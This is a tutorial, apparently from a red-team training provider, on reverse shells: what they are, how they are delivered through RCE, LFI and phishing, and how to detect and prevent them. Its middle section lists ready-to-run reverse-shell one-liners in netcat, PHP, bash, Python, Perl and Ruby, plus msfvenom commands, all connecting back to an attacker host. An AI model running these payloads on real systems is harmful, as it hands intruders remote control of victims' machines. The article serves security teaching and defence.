:orphan:
(perform-remote-code-execution-with-the-use-of-reverse-shells)=

# Perform Remote Code Execution with the Use of Reverse Shells

Reverse shells are frequently used in red team assessments to test your organization's IT infrastructure defense mechanisms. This article will go over the specifics of unique sort of a remote shell known as the reverse shell.

## What is a Shell?

A shell can be defined as an interface(command-line interface or graphical user interface) for interacting with your operating system. System administrators employ shell scripts to carry out their routine tasks. A shell is a script that is a series of commands to perform a specific task.

Our operating system is surrounded by various layers, each of which serves a different purpose. These layers are designed to protect operating system components from user input.

The shell program accepts commands or scripts as input from the user or application. The shell program then translates this data into a format that the kernel can understand and execute. The kernel is the operating system's crown jewel and is located at its heart. It is a collection of the operating system's most powerful and reliable processes. The kernel serves as a link between the operating system processes and the physical hardware.

It is this interaction of the shell with the OS kernel which makes it extremely powerful and dangerous at the same time.

## What is a Reverse Shell and how does it work?

A reverse shell is a malware that initiates a remote connection from the exploited victim's computer to the server running on the attacker's machine. The attacker can utilize this shell to establish a C&C (Command and Control) channel and send information back and forth.

Reverse shells are connect-back shells that allow remote access to a system's internal processes from a device outside of the protected network. Because most firewalls do not prevent outgoing connections, attackers can use reverse shells to bypass them and get a hold of the target system.

An attacker performs reconnaissance of the target network to determine whether ports and services allow outgoing connections. He can then use this information to establish an outbound connection to his own workstation, gaining access to the victim's machine.

A reverse shell can use a variety of communication methods, depending on the underlying protocol. Attackers exploit protocols including TCP, UDP, ICMP, DNS, and HTTP/HTTPS to create reverse shells. Reverse shells based on TCP and HTTP are more often utilized.

The TCP protocol is a reliable protocol, which makes utilizing a TCP reverse shell advantageous. It will ensure that the packets reach their proper destination without being damaged or lost.

The advantage of using an HTTP/HTTPS reverse shell is that outward HTTP traffic is unlikely to be flagged as suspicious by detection techniques.

## What is the purpose of a Reverse Shell?

System administrators frequently use remote shells such as Telnet or SSH to perform administrative tasks remotely. Remote system administration can make many remote systems more accessible. It also saves time by allowing tasks to be executed on numerous computers at the same time.

Attackers use reverse shells to create a C&C (Command and Control channel). A command and control channel is a covert communication channel that is used to send malicious commands to the remote victim machine and perform different activities. Reverse shell therefore can act as a backdoor for the attackers for activities such as privilege escalation or lateral movement (target more machines) within the network.

## Difference between Reverse Shell and a Bind Shell:

A bind shell occurs when an attacker's machine connects to a target machine's port or service. The attacker requests a connection with a service that is already listening on the victim system in a bind shell. In a reverse shell, the attacker creates a listener on his own machine and the victim machine initiates communication with the attacker's machine.

In order to connect with the victim machine in a bind shell, the attacker has to know its IP address. In a reverse shell, this is not a requirement because the host machine is the one seeking the connection with the attacker's machine.

It is difficult to gain remote access to a computer using a bind shell as most firewalls are configured to block incoming connections that are not from inside the protected network.

## Reverse Shell Execution Techniques:

Now we will explore some of the ways in which an attacker can inject a reverse shell on a computer.

<u>Remote Code Execution Vulnerability:</u>

When there is no/insufficient input validation in a web application, a remote code execution vulnerability can occur. This security flaw can be used by an attacker to insert malicious code into the input of a web app. This code is interpreted on the server side based on the web application's programming language.

RCE and reverse shell can thus be used to attack the underlying server of a web application. The attacker leverages the reverse shell to persist on the server host, continue his activities on the system or network discreetly, and evade detection for as long as possible.

<u>Local File Inclusion Vulnerability:</u>

When an attacker can cause a web application to reveal hidden information/files kept on the web server, this is known as a Local File Inclusion vulnerability. This vulnerability can be used to launch cross-site scripting attacks, steal sensitive data, and insert reverse shells, among other things.

An attacker can use the LFI vulnerability to inject the reverse shell payload into a file on the web server. When the attacker visits the file's link, the reverse shell is launched, providing the hacker remote access to the web server.

<u>Social Engineering:</u>

Social engineering and phishing attacks are also one of the approaches that can be used by the attacker to install a reverse shell in a system.

Social engineering attacks include manipulating human behavior in order to get them to do something that compromises the security of the data or systems.

A phishing attack occurs when a hacker embeds a malicious link in an email or on a website and convinces the victim into clicking on it. As a result, the attacker can steal important user information, install malware on his/her system, and much more.

Let's suppose an attacker already has a server running on his computer. He sends the victim user a seemingly harmless email with an embedded link containing the reverse shell payload. The reverse shell now triggers as soon as the user opens the link, giving the hacker access to the victim's PC.

## Examples of Simple Reverse Shells:

Different programming languages and tools can be used to generate reverse shells. This section goes through some of the most prevalent methods for making reverse shells.

<u>1. Netcat:</u>

Netcat is a command-line utility for sending and receiving data over a network. Netcat is extensively used in network penetration testing. The development and execution of reverse shells are one of the most common uses of Netcat when verifying the security of a network.

To use Netcat to build a reverse shell, you must first create a listener on your own machine. Let's suppose you want to create a listener on port 31337. You will use the following command:

`nc -l -p 31337`

This command is telling the server to listen for any incoming connections on this port. Now after creating this listener, your victim machine must use your machine's IP address to create a connection. Let's say your server's IP address is 10.0.0.2 and you are using port 31337 to listen for incoming connections.

For **Windows OS** you will use the following payload:

`nc 10.0.0.2 31337 -e cmd.exe`

The -e parameter instructs the target machine to use cmd.exe (command prompt) to interpret the incoming commands.

For **Linux OS** you will use the following payload:

`nc 10.0.0.2 31337 -e /bin/bash`

The -e switch instructs the target machine to interpret the incoming commands using bash shell.

<u>2. PHP Reverse Shell:</u>

Antivirus software can sometimes flag Netcat as malware, making its operation on the target machine problematic. In such cases, reverse shells written in other programming languages might be extremely valuable.

**Note:** We will use the IP address 10.0.0.2 and port 31337 for all of our examples.

If your target webserver uses the PHP programming language, you can use PHP to construct a reverse shell. You can use this one-liner PHP reverse shell payload:

`php -r '$socket=fsockopen("10.0.0.2",31337);exec("/bin/sh -i <&3 >&3 2>&3");'`

- The fsockopen function establishes a socket connection with the specified IP address and port number and saves the handle in the $socket variable.
- The exec function takes the input from this stream, executes it, and writes the output to it.

<u>3. Bash Reverse Shell:</u>

We can also use bash to construct reverse shells and connect to the target machine. This is an example of a reverse shell created with bash:

`bash -i >& /dev/tcp/10.0.0.2/31337 0>&1`

- /dev/tcp/IP address/Port number is used to create a tcp socket connection on the given IP address and port number.
- bash -i is used to create an interactive bash session on this tcp connection. It executes the commands that the server sends and writes the results to the stream.

<u>4. Python Reverse Shell:</u>

Reverse shells are also made with Python. The code below produces a reverse shell for the Linux operating system in python.

`python -c 'import socket,subprocess,os;sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sock.connect(("10.0.0.2",31337));os.dup2(sock.fileno(),0); os.dup2(sock.fileno(),1); os.dup2(sock.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

- This code is using the socket library in python. The socket.socket method is used to create a socket handle and store it in the sock variable.
- The socket library's connect method is then used to establish a TCP socket connection with the server's IP address and port number.
- The file descriptor of the socket we just constructed is referred to by sock.fileno(). Standard input, output, and error are denoted by the numbers 0, 1, and 2. The os.dup2 function copies the file descriptor of the socket to the STDIN, STDOUT, and STDERR file descriptors.
- The bash process now uses the socket file descriptor to read the input from the server, execute it and write the output to the stream.

<u>5. Perl Reverse Shell:</u>

This is an example of a reverse shell created using Perl language that uses a Linux OS.

`perl -e 'use Socket;$ip="10.0.0.2";$port=31337;socket(sock,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(sock,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&sock");open(STDOUT,">&sock");open(STDERR,">&sock");exec("/bin/sh -i");};'`

- This code uses the Socket function in Perl to create a TCP socket connection on the given server IP address and port number.

- It then associates the socket's handle(sock variable) with the STDIN, STDOUT, and STDERR (standard input, output, and error) using the open function.
- The bash process now uses the socket file descriptor to read the input from the server, execute it and write the output to the stream.

<u>6. Ruby Reverse Shell:</u>

You can also create a reverse shell using Ruby. This example creates a reverse shell in Ruby that uses a Linux OS.

`ruby -rsocket -e'h=TCPSocket.open("10.0.0.2",31337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",h,h,h)'`

- This code uses Ruby's TCPSocket library to create a tcp socket connection on the given IP address and port number. The socket handle is stored in variable h.
- The shell now reads incoming commands from the stream, executes them, and writes the output to the stream using the socket handle.

<u>7. MSFVenom:</u>

MSFVenom is a Metasploit command-line payload generator. It's used to build shell code for a variety of systems, including Windows 32-bit and 64-bit, Linux, Android, and more.
The syntax used to create a payload in msfvenom is as follows:

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP> LPORT=<PORT>`

Assume we want to create a TCP reverse shell payload in exe format for a victim machine running Windows 64 bit OS. The resulting payload is stored is in a file called revshell_x64.exe.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.2 LPORT=31337 -f exe > revshell_x64.exe`

Let's assume that the attacker delivers the payload file (revshell_x64.exe) to the user by email. The reverse shell is executed when the user clicks on the malicious link in the email, granting access to the computer.

## Detecting Reverse Shells:

Reverse shells can be difficult to detect, especially if they use protocols that are permitted on the network.

Reverse shells can be identified by monitoring the flow of traffic in your network and looking for suspicious activity in your logs. One of the tools that can help you detect reverse shells, is an IDS(intrusion detection system). There are two kinds of IDS, signature-based IDS and behavior-based/anomaly-based IDS.

Based on their pattern, signature-based intrusion detection systems may detect the most widely used reverse shells.

In addition to using attack signatures to detect reverse shells, behavioral or anomaly-based intrusion detection systems use machine learning and statistical analysis to detect abnormal network traffic. The usage of behavior/anomaly-based IDS can improve the chances of detecting reverse shells in your environment. This sort of IDS gives you a holistic view of the network and builds an understanding of usual network activity over time.

SIEM is another technology that can aid in the detection of reverse shells in your network. SIEM (Security Information and Event Management) is a centralized platform that collects various logs from an organization's IT infrastructure in order to identify potential security threats or incidents. These programs utilize web server access logs to spot unusual behavior in your environment.

Even the most sophisticated techniques, however, cannot ensure 100% detection of reverse shells in your network. A determined attacker can still circumvent your detection methods and get access to your network.

## Prevention of Reverse Shells:

As stated in the preceding section, complete detection of the reverse shell in your network is impossible. To secure your network and endpoints, the best security strategy is to prevent them from happening in the first place. This section describes several techniques for preventing reverse shell attacks in your network.

- Security issues in web applications that could lead to reverse shell exploitation should be extensively examined. Manual testing, as well as automated tools such as vulnerability scanners, must be used on a regular basis to help detect and prevent these vulnerabilities.

- Employee security awareness and training sessions should be held on a regular basis. Your trusted company network and workstations are used by your staff. They must be educated on the most recent attacker methods and how to spot them.

- Filter your network's outbound connections. There must be a proxy server between your internal network and the internet that thoroughly inspects the network packets and blocks any suspicious traffic.

- Implement the security hardening of your web server by disabling all unnecessary software, interpreters, services, ports, and connections. Implement strict access control and extensive logging capabilities.

- All endpoints should be set up to update anti-virus software automatically. It should not be possible for users to disable anti-virus software on their computers.

- Users should not be given administrative privileges on their workstations.

- Implement network segregation to minimize lateral movement of the attacker within your network.

- To efficiently detect abnormal network activity, use an anomaly-based NIDS (network intrusion detection system).

- Do not allow the executable files from unknown sources to run on the computer.

> **Looking to expand your knowledge of red teaming? Check out our online course, [MRT - Certified Red Teamer](https://www.mosse-institute.com/certifications/mrt-certified-red-teamer.html). In this course, you'll learn about the different aspects of red teaming and how to put them into practice.**
